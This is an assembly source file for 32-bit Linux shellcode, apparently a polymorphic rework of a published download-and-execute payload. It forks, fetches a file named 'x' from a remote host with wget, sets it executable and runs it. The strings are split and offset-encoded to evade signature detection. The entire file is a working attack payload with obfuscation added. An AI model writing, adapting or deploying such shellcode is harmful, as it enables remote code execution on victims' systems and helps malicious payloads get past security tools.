; MODIFIED SHELLCODE
; Filename: downloadexecpoly.nasm
; Author: Daniel Sauder
; Website: http://govolution.wordpress.com/
; Tested on: Ubuntu 12.04 / 32Bit
; License: http://creativecommons.org/licenses/by-sa/3.0/

; MODIFICATION SHELLCODE
; Description: Polymorphism modifications
; Author: Codor

; Shellcode:
; - download 192.168.2.222/x with wget
; - chmod x
; - execute x
; - x is an executable
; - length 108 bytes

global _start

section .text

_start:

    ;fork
    xor eax,eax
    mov al,0x1
    add al, 0x1
    int 0x80
    xor ebx,ebx
    cmp eax,ebx
    jz child
  
    ;wait(NULL)
    xor eax,eax
    mov al,0x7
    int 0x80
        
    ;chmod x
    xor ecx,ecx
    mov eax, ecx
    push eax
    mov al, 0xf
    push 0x78
    mov ebx, esp
    xor ecx, ecx
    mov cx, 0x1ff
    int 0x80
    
    ;exec x
    xor eax, eax
    push eax
    push 0x78
    mov ebx, esp
    push eax
    mov edx, esp
    push ebx
    mov ecx, esp
    mov al, 11
    int 0x80
    
child:
    ;download 192.168.2.222//x with wget
    push 0xb
    pop eax
    cdq
    push edx

    mov dword [esp-4], 0x782f2f74 ; t//x
    mov dword [esp-8], 0x736F686C ; lhos
    ;mov dword [esp-12], 0x61636f6c ; loca
    mov esi, 0x50525e5b
    add esi, 0x11111111
    mov dword [esp-12], esi ; loca

    sub esp, 12

    mov ecx,esp
    push edx
    
    mov byte [esp-1], 0x74
    mov esi, 0x5456661e
    add esi, 0x11111111
    mov dword [esp-5], esi ;egw/
    mov dword [esp-9], 0x6e69622f ;nib/
    mov dword [esp-13], 0x7273752f ;rsu/
    sub esp, 13
    mov ebx,esp
    push edx
    push ecx
    push ebx
    mov ecx,esp
    int 0x80
